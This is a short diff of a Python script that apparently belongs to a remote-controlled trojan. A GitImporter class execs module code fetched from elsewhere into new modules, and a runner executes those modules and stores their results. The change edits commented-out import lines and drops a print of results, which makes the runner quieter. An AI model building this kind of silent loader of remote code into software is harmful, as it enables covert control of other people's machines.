@@ -46,9 +46,11 @@ class GitImporter:
 
     def load_module(self, name):
         module = imp.new_module(name)
-        # module = importlib.import_module(name, "modules")
+
+        # module = importlib.import_module('modules.{}'.format(name))
+
         exec(self.current_module_code, module.__dict__)
-        # module = importlib.import_module(name, "modules")
+        
         # exec("self.current_module_code in module.__dict__")  #!?!?!?
         sys.modules[name] = module
         return module
@@ -106,7 +108,6 @@ def store_module_result(data):
 def module_runner(module):
     task_queue.put(1)
     result = sys.modules[module].run()
-    print(result)
     task_queue.get()
     store_module_result(result)
     return
